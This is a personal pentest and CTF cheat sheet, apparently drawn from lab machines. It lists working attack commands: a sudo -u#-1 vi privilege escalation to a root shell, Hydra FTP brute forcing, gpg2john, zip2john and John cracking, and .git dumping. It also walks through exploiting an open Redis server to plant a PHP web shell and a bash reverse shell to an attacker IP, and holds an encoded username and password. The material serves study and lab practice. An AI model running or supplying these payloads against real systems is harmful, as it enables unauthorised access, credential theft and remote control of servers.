# Vi editor and sudo vulnerability

- Type:
````shell
sudo -u#-1 /usr/bin/vi file
````
- Then type on the vi finder menu: `!/bin/sh`

# Brainfuck coding language
- An example:
````brainfuck
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <

## Equivalent to: 
User: eli
Password: DSpDiM1wAEwid
````
- Decoder/Encoder here: https://www.dcode.fr/brainfuck-language

# Hydra by ftp
````shell
hydra -l user -P passwords.txt ftp://<target-ip>
````

# Dirb basic command
````shell
dirb http://10.10.233.35/ /usr/share/wordlists/dirb/common.txt 
````

# Gobuster basic command
````shell
gobuster dir -u http://10.10.70.124/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 60
````

# Tac for print and read files
- Use the tool tac for printing files when cat, vi, vim... are blocked or not permitted:
````shell
tac /home/file.txt
````

# Import a .asc key
- Once you get the key:
````shell
gpg --import key.asc

# If you don't have the creds, you can brute force it using gpg2john
gpg2john key.asc > hash.txt
# Then you crack it with john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Now you do the import step, introduce the creds and after that do the decrypt step
gpg --decrypt credential.pgp
````

# Python3 remote http server
- Initiate it: `python3 -m http.server 8080`
- The on the target machine:
````shell
wget http://<attack-ip>:8080/file
````

# Login without password to FTP
- User:  `anonymous`

# Investigate image metadata (Stego)
- Use command `file image.png`
- Use command `exiftool image.png`
- Use command `xxd image.png`
- Use command `strings image.png`
- Use tool binwalk to search binary images for embedded files and executable code: `binwalk image.png`
	- To extract the file: `binwalk -e image.png`
- Use command: `steghide extract -sf image.png`

# Crack zip files
- First get the hash: `zip2john file.zip > hash`
- Then use command: `john --wordlist=/path/to/wordlist hash`

# Extract from cli
- Use command: `7z e file.zip`

# How to deal with a /.git/?
- Download the full repository: `wget --mirror http://<ip-target>/.git/`
- Once downloaded follow this steps:
	- Look at the commits: `git log --oneline`
	- Go down the history: `git checkout <commit> --force`
	- Now inspect the commit

# How to deal with a Redis database?
- Download redis-tools: `sudo apt install redis-tools`
- Use the following command to gather info: `info`
- Introduce a php RCE: 

````shell
redis-cli -h 10.10.60.159
10.10.60.159:6379> config set dir /var/www/html
OK
10.10.60.159:6379> config set dbfilename redis.php
OK
10.10.60.159:6379> set test "<?php phpinfo(); ?>"
OK
10.10.60.159:6379> save
OK
````
- Now in Firefox, navigate to `<target-ip>/redis.php`
- If it is shown the phpinfo() file, the try to run this to get a shell:

````shell
redis-cli -h 10.10.60.159
10.10.60.159:6379> config set dir /var/www/html
OK
10.10.60.159:6379> config set dbfilename redisshell.php
OK
10.10.60.159:6379> set test "<?php system($_GET['cmd']); ?>"
OK
10.10.60.159:6379> save
OK
````

- Now on the web-nav put something like this: `view-source:http://10.10.60.159/redisshell.php?cmd=%20cat%20/etc/passwd`
- Now set up a listener and create a simple reverse php shell:
````shell
redis-cli -h 10.10.60.159
10.10.60.159:6379> config set dir /var/www/html
OK
10.10.60.159:6379> config set dbfilename redisshell.php
OK
10.10.60.159:6379> set test "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/<attck-ip>/<port> 0>&1'\"); ?>"
OK
10.10.60.159:6379> save
OK
````

# Piet Esoteric Language
- This language is presented in images like this:
![](img/PI3T.png)
- To decode this image content just follow these steps:
	- Download Gimp: `sudo apt install gimp`
	- Open the image wit Gimp and Export it as .ppm file: `Export as > .ppm`
	- Now download the Piet interpreter: 
	````shell
	sudo su
	git clone https://github.com/gleitz/npiet.git
	cd npiet
	./configure
	make
	````
	- Execute the image with the interpreter: `./npiet /path/to/the/image.ppm`

